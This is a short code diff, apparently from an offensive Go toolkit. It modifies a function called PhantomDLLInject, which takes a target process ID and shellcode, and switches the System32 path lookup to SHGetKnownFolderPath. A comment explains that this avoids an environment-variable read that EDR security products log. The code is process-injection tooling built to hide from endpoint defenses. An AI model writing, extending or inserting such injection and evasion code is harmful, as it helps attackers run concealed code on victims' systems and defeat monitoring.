@@ -42,12 +42,12 @@ func PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealtho
 		return err
 	}
 
-	// 1. Build full path from System32 — resolve via SHGetSpecialFolderPathW
+	// 1. Build full path from System32 — resolve via SHGetKnownFolderPath
 	// (Shell32) instead of os.Getenv("SYSTEMROOT") to avoid the PEB env-var
 	// sniff that EDRs commonly log on credential-style techniques.
-	sys32 := folder.Get(folder.CSIDL_SYSTEM, false)
-	if sys32 == "" {
-		return fmt.Errorf("PhantomDLLInject: SHGetSpecialFolderPathW(CSIDL_SYSTEM) returned empty")
+	sys32, err := folder.GetKnown(windows.FOLDERID_System, 0)
+	if err != nil {
+		return fmt.Errorf("PhantomDLLInject: SHGetKnownFolderPath(FOLDERID_System): %w", err)
 	}
 	dllPath := filepath.Join(sys32, dllName)
 
